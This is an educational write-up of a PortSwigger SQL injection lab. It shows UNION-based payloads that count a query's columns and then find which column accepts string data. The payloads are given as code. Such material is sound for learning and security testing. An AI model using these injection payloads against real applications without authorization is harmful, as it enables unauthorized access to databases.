# SQL injection UNION attack, finding a column containing text

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

---

## Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

---

## OWASP Category

SQLi-UNION

---

## Steps to Solve

**Step 1 — Check the number of comlumns**

Inject he SQL payload in catagory parameter to check number of columns.
```http
' union select null,null,null--
```
**FOUND** 3 columns

<img width="1267" height="706" alt="image" src="https://github.com/user-attachments/assets/ff4765e0-0ec2-4db6-af02-cfc32ddce5ea" />


---

**Step 2 — Sring value in data**

Try to found each columns data is string or not with given random string value **oyFMM6**
```http
' union select 'oyFMM6',null,null--
' union select null,'oyFMM6',null--
' union select null,null,'oyFMM6'--
```

With **2nd** payload **' union select null,'oyFMM6',null--** we crack that column number **2** compitable with string data type.

<img width="1515" height="616" alt="image" src="https://github.com/user-attachments/assets/46ceb0f0-4777-4c52-a48e-b76d9efbf2fc" />

---

**Lab Solved**

<img width="1547" height="610" alt="image" src="https://github.com/user-attachments/assets/66a2c9bd-faa1-4203-b4b5-7707ea19e6ee" />

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
